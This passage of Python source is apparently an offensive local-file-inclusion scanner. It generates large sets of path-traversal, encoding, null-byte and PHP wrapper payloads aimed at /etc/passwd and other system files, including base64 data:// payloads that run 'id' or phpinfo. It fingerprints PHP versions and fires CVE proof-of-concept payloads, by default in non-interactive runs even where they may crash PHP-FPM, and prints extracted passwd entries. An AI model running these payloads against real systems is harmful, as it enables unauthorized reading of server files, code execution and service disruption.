            variants.add(f"..//..//..//..//..//{file_path}")
        return list(variants)
    
    def generate_double_encoding_variants(self, file_path: str) -> List[str]:
        variants = set()
        clean = file_path.lstrip('/')
        variants.add(f"..%252f..%252f..%252f..%252f{clean}")
        variants.add(f"..%252f..%252f..%252f..%252f..%252f{clean}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}")
        variants.add(f"..%255c..%255c..%255c..%255c{clean}")
        variants.add(f"%252e%252e%255c%252e%252e%255c{clean}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}")
        if self.intensity == "aggressive":
            for i in range(1, 6):
                pre = "..%252f" * i
                variants.add(pre + clean)
            variants.add("%25%32%65%25%32%65%25%32%66" + clean)
            variants.add("%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66" + clean)
        encoded_path = urllib.parse.quote(file_path)
        variants.add(f"..%252f..%252f..%252f..%252f{encoded_path}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{encoded_path}")
        return list(variants)
    
    def generate_filter_chains(self) -> List[str]:
        chains = []
        for r in range(1, 3):
            for combo in itertools.permutations(self.FILTER_CHAINS[:15], r):
                chains.append("|".join(combo))
        return chains
    
    def generate_null_byte_bypasses(self, file_path: str) -> List[str]:
        variants = set()
        clean_path = file_path.lstrip('/')
        for null in ["%00", "\x00", "%2500"]:
            variants.add(f"{clean_path}{null}")
            variants.add(f"....//....//....//....//{clean_path}{null}")
            variants.add(f"..%2f..%2f..%2f..%2f{clean_path}{null}")
            variants.add(f"..%252f..%252f..%252f..%252f{clean_path}{null}")
            variants.add(f"..%c0%af..%c0%af..%c0%af{clean_path}{null}")
        for null in ["%00", "\x00"]:
            for ext in self.COMMON_EXTENSIONS[:10]:
                variants.add(f"{clean_path}{null}{ext}")
                variants.add(f"....//....//....//....//{clean_path}{null}{ext}")
                variants.add(f"..%2f..%2f..%2f..%2f{clean_path}{null}{ext}")
                variants.add(f"..%252f..%252f..%252f..%252f{clean_path}{null}{ext}")
                variants.add(f"../../../{clean_path}{null}{ext}")
                variants.add(f"..%2f..%2f..%2f{clean_path}{null}{ext}")
                variants.add(f"..%252f..%252f..%252f{clean_path}{null}{ext}")
                variants.add(f"....//....//....//....//{clean_path}{null}{ext}")
        for sep in ["?", "&", "#"]:
            variants.add(f"{clean_path}{sep}")
            for ext in self.COMMON_EXTENSIONS[:5]:
                variants.add(f"{clean_path}{sep}{ext}")
                variants.add(f"../../../{clean_path}{sep}{ext}")
                variants.add(f"..%252f..%252f..%252f{clean_path}{sep}{ext}")
        for sep in [";", ";/"]:
            variants.add(f"{clean_path}{sep}")
            variants.add(f"../../../{clean_path}{sep}")
            variants.add(f"....//....//....//....//{clean_path}{sep}")
        if self.intensity == "aggressive":
            long_path = "/." * 100
            variants.add(f"{clean_path}{long_path}")
            variants.add(f"../../../{clean_path}{long_path}")
            variants.add(f"{clean_path}...........................................................................")
            variants.add(f"../../../{clean_path}...........................................................................")
            for null in ["%00", "%2500"]:
                for ext in [".php", ".html", ".jpg", ".png", ".gif", ".txt", ".inc"]:
                    variants.add(f"..%252f..%252f..%252f..%252f{clean_path}{null}{ext}")
                    variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean_path}{null}{ext}")
        return list(variants)
    
    def generate_extension_stripping_bypasses(self, file_path: str) -> List[str]:
        variants = set()
        clean_path = file_path.lstrip('/')
        path_no_ext = clean_path.rsplit('.', 1)[0] if '.' in clean_path else clean_path
        bypass_patterns = [ f"{path_no_ext}%00", f"{path_no_ext}%00.php", f"{path_no_ext}%00.html", f"{path_no_ext}%00.jpg", f"{path_no_ext}%00.png", f"{path_no_ext}%00.txt", f"{path_no_ext}%00.inc", f"{path_no_ext}.php%00", f"{path_no_ext}.php%00.png", f"{path_no_ext}.php%00.jpg", f"{path_no_ext}.php%00.html", f"{path_no_ext}.php%00.txt", f"{path_no_ext}.php/.", f"{path_no_ext}.php%00.", f"{path_no_ext}.php/.", f"{path_no_ext}.php%00.pdf", f"{path_no_ext}%2ephp", f"{path_no_ext}.pHp", f"{path_no_ext}.PHP", f"{path_no_ext}.PhP", f"{path_no_ext}.phtml", f"{path_no_ext}.pHP", f"{path_no_ext}.Php", f"{path_no_ext}.phP", f"php://filter/convert.base64-encode/resource={clean_path}", f"php://filter/string.rot13/resource={clean_path}", f"php://filter/convert.iconv.utf-8.utf-16/resource={clean_path}", f"{clean_path}/.", f"{clean_path}/./.", f"{clean_path}/././.", f"{path_no_ext}%00.jpg%00", f"{path_no_ext}%00.png%00", f"{path_no_ext}%00.php%00", ]
        variants.update(bypass_patterns)
        for pattern in bypass_patterns[:20]:
            variants.add(f"../../../{pattern}")
            variants.add(f"....//....//....//....//{pattern}")
            variants.add(f"..%252f..%252f..%252f..%252f{pattern}")
            variants.add(f"..%2f..%2f..%2f..%2f{pattern}")
            if self.intensity == "aggressive":
                variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{pattern}")
                variants.add(f"..%c0%af..%c0%af..%c0%af{pattern}")
        return list(variants)
    
    def generate_specific_lab_bypasses(self) -> List[str]:
        payloads = set()
        for target in ["/etc/passwd", "/etc/hosts", "/etc/hostname", "/etc/issue"]:
            clean = target.lstrip('/')
            payloads.add(f"../../../{clean}%00.png")
            payloads.add(f"../../../{clean}%00.jpg")
            payloads.add(f"../../../{clean}%00.php")
            payloads.add(f"../../../{clean}%00.html")
            payloads.add(f"../../../{clean}%00.txt")
            payloads.add(f"....//....//....//....//{clean}%00.png")
            payloads.add(f"....//....//....//....//{clean}%00.jpg")
            payloads.add(f"..%2f..%2f..%2f{clean}%00.png")
            payloads.add(f"..%2f..%2f..%2f{clean}%00.jpg")
            payloads.add(f"..%252f..%252f..%252f{clean}%2500.png")
            payloads.add(f"..%252f..%252f..%252f{clean}%2500.jpg")
            payloads.add(f"{clean}%00.html")
            payloads.add(f"{clean}%00.png")
            payloads.add(f"{clean}.php%00.png")
            payloads.add(f"{clean}.php%00.jpg")
            payloads.add(f"{clean}%00.jpg")
            payloads.add(f"{clean}%00.txt")
            payloads.add(f"..%252f..%252f..%252f..%252f{clean}%00.png")
            payloads.add(f"..%252f..%252f..%252f..%252f{clean}%00.jpg")
            payloads.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}%00.png")
            payloads.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}%00.jpg")
            payloads.add(f"../../../{clean}%00")
            payloads.add(f"../../../{clean}%2500")
            payloads.add(f"../../../{clean}%00.")
            payloads.add(f"../../../{clean}%00..")
            payloads.add(f"../../../{clean}%00%00")
            payloads.add(f"../../../{clean}.php%00.png")
            payloads.add(f"../../../{clean}.php%00.jpg")
            payloads.add(f"..%252f..%252f..%252f{clean}.php%00.png")
            payloads.add(f"../../../{clean}?.png")
            payloads.add(f"../../../{clean}?.jpg")
            payloads.add(f"../../../{clean}?.html")
            payloads.add(f"../../../{clean}#.png")
            payloads.add(f"../../../{clean}#.jpg")
            payloads.add(f"../../../{clean};.png")
            payloads.add(f"../../../{clean};.jpg")
            payloads.add(f"../../../{clean};")
        for target in self.FILE_TARGETS[:5]:
            clean = target.lstrip('/')
            payloads.add(f"/var/www/images/../../../..{target}")
            payloads.add(f"/var/www/images/../../../../../..{target}")
            payloads.add(f"/var/www/html/../../../..{target}")
            payloads.add(f"/var/www/html/../../../../../..{target}")
            payloads.add(f"/images/../../../..{target}")
            payloads.add(f"/static/../../../..{target}")
            payloads.add(f"/uploads/../../../..{target}")
            payloads.add(f"/assets/../../../..{target}")
            payloads.add(f"/css/../../../..{target}")
            payloads.add(f"/js/../../../..{target}")
            payloads.add(f"/img/../../../..{target}")
        for target in self.FILE_TARGETS[:8]:
            payloads.add(target)
            payloads.add(f"file://{target}")
        payloads.add("php://filter/convert.base64-encode/resource=/etc/passwd")
        payloads.add("php://filter/string.rot13/resource=/etc/passwd")
        payloads.add("php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd")
        payloads.add("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd")
        payloads.add("php://filter/convert.base64-encode/resource=../../../etc/passwd")
        payloads.add("php://filter/string.rot13/resource=../../../etc/passwd")
        payloads.add("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==")
        payloads.add("data://text/plain,<?php phpinfo();?>")
        payloads.add("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==")
        if self.intensity == "aggressive":
            for target in self.FILE_TARGETS[:5]:
                clean = target.lstrip('/')
                payloads.add(f"....//....//....//....//....//....//{clean}%00.png")
                payloads.add(f"..%252f..%252f..%252f..%252f..%252f{clean}%00.png")
                payloads.add(f"..%c0%af..%c0%af..%c0%af..%c0%af{clean}%00.png")
                payloads.add(f"..%c0%ae%c0%ae%c0%af{clean}%00.png")
                payloads.add(f"%c0%ae%c0%ae%c0%af{clean}%00.png")
                payloads.add(f"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f{clean}%00.png")
        return list(payloads)
    
    def generate(self) -> Generator[str, None, None]:
        for p in self.cve_payloads:
            yield p

        file_targets = self.custom_files if self.custom_files else self.FILE_TARGETS
        if self.target_dir:
            file_targets = [self.target_dir] + list(file_targets)
        filter_chains = self.generate_filter_chains()
        if self.intensity == "light":
            filter_chains = filter_chains[:5]
        elif self.intensity == "normal":
            filter_chains = filter_chains[:15]
        yield from self.generate_specific_lab_bypasses()
        for target in file_targets:
            yield from self.generate_null_byte_bypasses(target)
        if self.intensity in ["aggressive", "normal"]:
            for target in file_targets:
                yield from self.generate_extension_stripping_bypasses(target)
        for target in file_targets:
            yield target
            yield f"....//....//....//....//{target}"
            yield f"..%252f..%252f..%252f..%252f{target}"
            yield f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{target}"
            yield f"..%2f..%2f..%2f..%2f{target}"
        for target in file_targets:
            path_variants = self.generate_path_variants(target)
            double_encoded = self.generate_double_encoding_variants(target)
            all_paths = set(path_variants + double_encoded)
            for path in all_paths:
                yield path
                yield urllib.parse.quote(path, safe='%')
                if self.intensity in ["aggressive", "normal"]:
                    yield urllib.parse.quote(urllib.parse.quote(path, safe='%'), safe='%')
                for null in self.NULL_BYTE_VARIANTS:
                    if self.intensity == "aggressive" or null in ["%00", "\x00", "%2500"]:
                        yield f"{path}{null}"
                        yield f"{urllib.parse.quote(path, safe='%')}{null}"
                if self.intensity == "aggressive":
                    for ext in [".", "./", ".php", ".html", ".jpg", ".txt", ".png", ".gif"]:
                        yield f"{path}{ext}"
                        yield f"{urllib.parse.quote(path, safe='%')}{ext}"
                for wrapper in self.WRAPPER_PAYLOADS:
                    if "{PATH}" in wrapper and "{FILTER}" in wrapper:
                        for chain in filter_chains[:5]:
                            yield wrapper.replace("{FILTER}", chain).replace("{PATH}", path)
                    elif "{PATH}" in wrapper:
                        yield wrapper.replace("{PATH}", path)
                    else:
                        yield wrapper
        if self.intensity == "aggressive":
            for target in file_targets:
                yield f"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f{target}"
                yield f"%ef%bc%8f%ef%bc%8f%ef%bc%8f{target}"
                yield f"..%c0%ae%c0%ae%c0%af{target}"
                yield f"%c0%ae%c0%ae%c0%af{target}"
                yield f"..%c0%af..%c0%af..%c0%af{target}"
                yield f"..%c0%2f..%c0%2f..%c0%2f{target}"
                clean = target.lstrip('/')
                yield f"..././..././..././{clean}"
                yield f"..//..//..//..//..//{clean}"
                yield f"....//....//....//....//....//....//{clean}"
                yield f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}"


class ProgressAnimator(threading.Thread):
    def __init__(self, scanner):
        super().__init__(daemon=True)
        self.scanner = scanner
        self.running = True
    def run(self):
        spinner = it.cycle(["|", "/", "-", "\\"])
        while self.running:
            with self.scanner.lock:
                print(f"\r[{next(spinner)}] Tested: {self.scanner.tested} | Findings: {len(self.scanner.findings)} | Active Workers: {self.scanner.active_workers}", end="", flush=True)
            time.sleep(0.1)


class LFIScanner:
    def __init__(self, client: HTTPClient, delay: float = 0.05, threads: int = 10, method: str = "GET", 
                 post_data: Dict = None, target_files: Optional[List[str]] = None, target_dir: Optional[str] = None,
                 intensity: str = "normal", output_file: Optional[str] = None, verbose: bool = False,
                 smart_mode: bool = False, no_validation: bool = False):
        self.client = client
        self.delay = delay
        self.threads = threads
        self.method = method.upper()
        self.post_data = post_data or {}
        self.stop = False
        self.findings: List[Finding] = []
        self.tested = 0
        self.active_workers = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.target_files = target_files
        self.target_dir = target_dir
        self.intensity = intensity
        self.output_file = output_file
        self.verbose = verbose
        self.smart_mode = smart_mode
        self.no_validation = no_validation
        self.discovered_paths = set()
        self.doc_root = None
        self.baseline = None
        self.detected_php_version: Optional[str] = None
        self.detected_glibc_version: Optional[str] = None
        self.cve_payloads: List[str] = []
        signal.signal(signal.SIGINT, self._handle_stop)
    
    def _handle_stop(self, *_):
        print("\n\033[93m[!] Stopping scan...\033[0m")
        self.stop = True
    
    def get_speed(self) -> float:
        elapsed = time.time() - self.start_time
        return self.tested / elapsed if elapsed > 0 else 0
    
    def save_results(self):
        if not self.output_file:
            return
        try:
            results = {'scan_info': {'total_tested': self.tested, 'duration': time.time() - self.start_time,
                                     'findings_count': len(self.findings),
                                     'detected_php_version': self.detected_php_version,
                                     'detected_glibc_version': self.detected_glibc_version,
                                     'cve_payloads_used': len(self.cve_payloads)},
                       'findings': []}
            for finding in self.findings:
                results['findings'].append({
                    'type': finding.vuln_type,
                    'confidence': finding.confidence,
                    'payload': finding.payload,
                    'url': finding.url,
                    'details': finding.details,
                    'content_snippet': finding.content_snippet,
                    'verified': finding.verified
                })
            with open(self.output_file, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\n\033[96m[*] Results saved to: {self.output_file}\033[0m")
        except Exception as e:
            print(f"\n\033[91m[!] Failed to save results: {str(e)}\033[0m")
    
    def _build_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        query_params = parse_qs(parsed.query)
        query_params[param] = [urllib.parse.quote(payload, safe='%')]
        new_query = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _build_body(self, param: str, payload: str) -> str:
        body_data = self.post_data.copy()
        body_data[param] = payload
        return "&".join([f"{k}={v}" for k, v in body_data.items()])
    
    def establish_baseline(self, url: str, param: str):
        dummy_payload = "../../../../../../../../nonexistent_file_xyz_123"
        safe = urllib.parse.quote(dummy_payload)
        if self.method == "GET":
            full_url = self._build_url(url, param, safe)
            resp = self.client.get(full_url)
        else:
            body = self._build_body(param, safe)
            resp = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        
        if resp:
            self.baseline = {
                'status_code': resp.status_code,
                'length': len(resp.text),
                'headers': dict(resp.headers),
                'content': resp.text[:500]
            }
            if self.verbose:
                print(f"\033[90m[*] Baseline established: status={resp.status_code}, length={len(resp.text)}\033[0m")
        else:
            self.baseline = {'status_code': 0, 'length': 0, 'headers': {}, 'content': ''}
    
    def fingerprint_php(self, url: str, param: str):
        if self.verbose:
            print("\033[96m[*] Fingerprinting PHP...\033[0m")
        safe_payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
        if self.method == "GET":
            full_url = self._build_url(url, param, safe_payload)
            resp = self.client.get(full_url)
        else:
            body = self._build_body(param, safe_payload)
            resp = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if resp:
            self.detected_php_version = ResponseAnalyzer.extract_php_version(resp.text, dict(resp.headers))
            self.detected_glibc_version = ResponseAnalyzer.extract_glibc_version(resp.text)
        if self.verbose:
            if self.detected_php_version:
                print(f"\033[94m[*] Detected PHP version: {self.detected_php_version}\033[0m")
            if self.detected_glibc_version:
                print(f"\033[94m[*] Detected glibc version: {self.detected_glibc_version}\033[0m")
            if not self.detected_php_version:
                print("\033[93m[!] Could not fingerprint PHP version.\033[0m")
    
    def _prompt_cve_payloads(self, relevant: List[Dict]):
        print("\n\033[93m[!] This PHP version seems to be vulnerable to the following CVEs:\033[0m")
        for cve in relevant:
            inc = " \033[90m(version incomplete — may be patched)\033[0m" if cve.get("incomplete_version") else ""
            print(f"    - \033[91m{cve['cve_id']}\033[0m: {cve['name']}  ({cve['severity']}){inc}")
            if cve.get("may_crash_phpfpm") and self.verbose:
                print(f"      \033[93m[!] Warning: detection may crash target PHP-FPM\033[0m")
        
        if not sys.stdin.isatty():
            answer = "y"
            print("\033[93m[!] Non-interactive session – defaulting to Y\033[0m")
        else:
            try:
                answer = input("\n\033[96m[?] Run payloads based on public PoCs for detected vulnerabilities? [Y/n]: \033[0m").strip().lower()
            except EOFError:
                answer = "y"
        
        if answer in ("", "y", "yes", "t", "tak"):
            sid = self.client.session.cookies.get("PHPSESSID", "") or ""
            skipped = 0
            for cve in relevant:
                for poc in cve.get("poc_payloads", []):
                    p = poc
                    if "{PATH}" in p:
                        p = p.replace("{PATH}", "/etc/passwd")
                    if "{SID}" in p:
                        if not sid:
                            skipped += 1
                            continue
                        p = p.replace("{SID}", sid)
                    self.cve_payloads.append(p)
            if skipped and self.verbose:
                print(f"\033[93m[!] Skipped {skipped} session payload(s) – no PHPSESSID cookie found\033[0m")
            print(f"\033[92m[+] Loaded {len(self.cve_payloads)} CVE-based payload(s).\033[0m")
        else:
            print("\033[93m[!] Skipping CVE payloads.\033[0m")
    
    def scan_payload(self, url: str, param: str, payload: str, candidate_list: List[Finding]):
        if self.stop:
            return
        if self.delay > 0:
            time.sleep(self.delay)
        with self.lock:
            self.active_workers += 1
        try:
            safe_payload = urllib.parse.quote(payload, safe='%')
            if self.method == "GET":
                full_url = self._build_url(url, param, safe_payload)
                response = self.client.get(full_url)
            else:
                body = self._build_body(param, safe_payload)
                full_url = url
                response = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            
            with self.lock:
                self.tested += 1
            
            if not response:
                return
            
            analysis = ResponseAnalyzer.analyze(
                response.text, dict(response.headers), self.baseline,
                status_code=response.status_code, payload=payload,
            )
            
            if self.smart_mode and analysis['details'].get('php_errors'):
                path = analysis['details']['php_errors'].get('exposed_path')
                if path and path not in self.discovered_paths:
                    self.discovered_paths.add(path)
                    if not self.doc_root and 'possible_doc_root' in analysis['details']['php_errors']:
                        self.doc_root = analysis['details']['php_errors']['possible_doc_root']
                        print(f"\n\033[94m[*] Possible document root: {self.doc_root}\033[0m")
            
            if self.verbose and analysis['confidence'] > 0.3:
                snippet_info = f"\033[90m | Content: {analysis['content_snippet']}\033[0m" if analysis.get('content_snippet') else ""
                # counting multiple entries
                count_info = ""
                if analysis['details'].get('passwd_count'):
                    count_info = f"\033[92m | {analysis['details']['passwd_count']} passwd entries\033[0m"
                print(f"\n\033[90m[*] {payload[:60]} | {response.status_code} | {analysis['vulnerability_type']} | {analysis['confidence']:.2f}{snippet_info}{count_info}\033[0m")
            
            if analysis['vulnerability_type'] and analysis['confidence'] > 0.5:
                with self.lock:
                    finding = Finding(
                        payload=payload,
                        vuln_type=analysis['vulnerability_type'],
                        confidence=analysis['confidence'],
                        details=analysis['details'],
                        url=full_url,
                        content_snippet=analysis.get('content_snippet', ''),
                        verified=False
                    )
                    candidate_list.append(finding)
        except Exception as e:
            if self.verbose:
                print(f"\n\033[91m[!] Error: {str(e)[:50]}\033[0m")
        finally:
            with self.lock:
                self.active_workers -= 1
    
    def verify_candidates(self, url: str, param: str, candidates: List[Finding]) -> List[Finding]:
        if self.no_validation:
            return candidates
        verified = []

        for cand in candidates:
            target = None
            for known in PayloadGenerator.FILE_TARGETS:
                if known in cand.payload:
                    target = known
                    break
            if not target:
                target = cand.payload[:50]
            
            verif_payloads = []
            if target:
                pg = PayloadGenerator(custom_files=[target], intensity="light")
                for pl in pg.generate():
                    if pl not in [cand.payload]:
                        verif_payloads.append(pl)
                        if len(verif_payloads) >= 10:
                            break
            
            if not verif_payloads:
                orig = cand.payload
                for enc in ['', urllib.parse.quote(orig, safe='%'), urllib.parse.quote(urllib.parse.quote(orig, safe='%'), safe='%')]:
                    if enc and enc != orig:
                        verif_payloads.append(enc)
                for null in ['%00', '\x00', '%2500']:
                    verif_payloads.append(orig + null)
            
            success_count = 0
            for vp in verif_payloads[:5]:
                if self.stop:
                    break
                try:
                    safe_vp = urllib.parse.quote(vp, safe='%')
                    if self.method == "GET":
                        full_url = self._build_url(url, param, safe_vp)
                        resp = self.client.get(full_url)
                    else:
                        body = self._build_body(param, safe_vp)
                        resp = self.client.post(url, body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
                    if resp:
                        analysis = ResponseAnalyzer.analyze(
                            resp.text, dict(resp.headers), self.baseline,
                            status_code=resp.status_code, payload=vp,
                        )
                        if analysis['vulnerability_type'] and analysis['confidence'] > 0.5:
                            success_count += 1
                except Exception:
                    pass
                time.sleep(self.delay * 0.5)
            
            if success_count >= 2:
                cand.verified = True
                verified.append(cand)
            else:
                if self.verbose:
                    print(f"\033[90m[*] Verification failed for {cand.payload[:40]} (only {success_count} successes)\033[0m")
        
        return verified
    
    def scan(self, url: str, param: str):
        print(f"\033[96m[*] Target: {url}\033[0m")
        print(f"\033[96m[*] Parameter: {param}\033[0m")
        print(f"\033[96m[*] Threads: {self.threads}\033[0m")
        print(f"\033[96m[*] Intensity: {self.intensity}\033[0m")
        if self.smart_mode:
            print(f"\033[96m[*] Smart mode: enabled\033[0m")
        if self.target_dir:
            print(f"\033[96m[*] Target directory: {self.target_dir}\033[0m")
        if self.target_files:
            print(f"\033[96m[*] Custom files: {len(self.target_files)}\033[0m")
        print()
        
        print("\033[96m[*] Establishing baseline...\033[0m")
        self.establish_baseline(url, param)
        if not self.baseline:
            print("\033[91m[!] Failed to establish baseline. Continuing anyway.\033[0m")
        
        self.fingerprint_php(url, param)
        if self.detected_php_version:
            relevant = CVEMapper.get_relevant_cves(
                php_version=self.detected_php_version,
                glibc_version=self.detected_glibc_version,
            )
            if relevant:
                self._prompt_cve_payloads(relevant)
            else:
                if self.verbose:
                    print("\033[90m[*] No matching CVE found for detected PHP version.\033[0m")
        
        payload_generator = PayloadGenerator(
            custom_files=self.target_files,
            target_dir=self.target_dir,
            intensity=self.intensity,
            smart_mode=self.smart_mode,
            doc_root=self.doc_root,
            cve_payloads=self.cve_payloads,
        )
        seen = set()
        payloads = []
        for pl in payload_generator.generate():
            if pl not in seen:
                seen.add(pl)
                payloads.append(pl)
                if len(payloads) > 50000:
                    break
        print(f"\033[96m[*] Generated {len(payloads)} unique payloads\033[0m\n")
        
        candidates: List[Finding] = []
        animator = ProgressAnimator(self)
        animator.start()
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for payload in payloads:
                    if self.stop:
                        break
                    futures.append(executor.submit(self.scan_payload, url, param, payload, candidates))
                for future in as_completed(futures):
                    if self.stop:
                        break
        finally:
            animator.running = False
            print()
        
        if self.stop:
            print("\033[93m[!] Scan interrupted.\033[0m")
            self.save_results()
            return
        
        print(f"\033[96m[*] Found {len(candidates)} candidate(s) with confidence > 0.5\033[0m")
        if not candidates:
            print("\033[91m[-] No candidates found. Exiting.\033[0m")
            self.save_results()
            return
        
        if not self.no_validation:
            print("\033[96m[*] Starting verification phase...\033[0m")
            verified_findings = self.verify_candidates(url, param, candidates)
            print(f"\033[96m[*] Verified {len(verified_findings)} finding(s)\033[0m")
            self.findings = verified_findings
        else:
            self.findings = candidates
        
        self.summary()
        if self.output_file:
            self.save_results()
    
    def summary(self):
        print("\n\033[95m=== SUMMARY ===\033[0m")
        print(f"Total tested: {self.tested}")
        print(f"Findings: {len(self.findings)}")
        if self.detected_php_version:
            print(f"Detected PHP: {self.detected_php_version}")
        if self.detected_glibc_version:
            print(f"Detected glibc: {self.detected_glibc_version}")
        if self.cve_payloads:
            print(f"CVE payloads used: {len(self.cve_payloads)}")
        if self.findings:
            for f in self.findings:
                verified_mark = " \033[92m[VERIFIED]\033[0m" if f.verified else ""
                print(f"{f.vuln_type} (conf={f.confidence:.2f}){verified_mark}: {f.payload}")
                if f.details.get('passwd_count'):
                    print(f"  \033[92mEntries extracted: {f.details['passwd_count']}\033[0m")
                if f.content_snippet:
                    print(f"  Content: {f.content_snippet}")
                if self.verbose and f.details.get('passwd_lines'):
                    print(f"  \033[90m--- Full passwd dump ({len(f.details['passwd_lines'])} entries) ---\033[0m")
                    for line in f.details['passwd_lines']:
                        print(f"  \033[90m{line}\033[0m")
                    print(f"  \033[90m--- End of dump ---\033[0m")
        else:
            print("\n\033[91m[-] No vulnerabilities found\033[0m")


def main():
    warnings.filterwarnings("ignore")
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("param")
    parser.add_argument("--proxy", help="Authenticate via proxy user:pass@proxydomain.com:port")
    parser.add_argument("--delay", type=float, default=0.05)
    parser.add_argument("--threads", type=int, default=20)
    parser.add_argument("--follow-redirects", action="store_true")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="Change request method")
    parser.add_argument("--data", help="POST data")
    parser.add_argument("--cookie", help="Session cookies")
    parser.add_argument("--header", action="append", help="Add custom headers")
    parser.add_argument("--user-agent", default="wraphper/2.3.1", help="Custom User-Agent")
    parser.add_argument("--target-file", action="append", help="Target specific file")
    parser.add_argument("--target-dir", help="Target specific directory")
    parser.add_argument("--target-list", help="File with list of targets")
    parser.add_argument("--intensity", choices=["light", "normal", "aggressive"], default="normal")
    parser.add_argument("--output", help="Save results to JSON file")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--smart", action="store_true", help="Smart mode: use path disclosures to optimize payloads")
    parser.add_argument("--no-validation", action="store_true", help="Skip verification phase (faster but less accurate)")
    args = parser.parse_args()
    Banner.show()
    
    target_files = []
    if args.target_file:
        target_files.extend(args.target_file)
    if args.target_list:
        try:
            with open(args.target_list, 'r') as f:
                target_files.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(f"\033[91m[!] File not found: {args.target_list}\033[0m")
            return
    if args.target_dir:
        target_files.append(args.target_dir)
    
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
    
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = value
    
    client = HTTPClient(
        proxy=args.proxy,
        follow_redirects=args.follow_redirects,
        verify_ssl=not args.insecure,
        cookies=cookies,
        headers=headers,
        timeout=args.timeout,
        user_agent=args.user_agent,
        max_retries=2
    )
    
    scanner = LFIScanner(
        client=client,
        delay=args.delay,
        threads=args.threads,
        method=args.method,
        post_data=post_data,
        target_files=target_files if target_files else None,
        target_dir=args.target_dir,
        intensity=args.intensity,
        output_file=args.output,
        verbose=args.verbose,
        smart_mode=args.smart,
        no_validation=args.no_validation
    )
    scanner.scan(args.url, args.param)


if __name__ == "__main__":
    main()
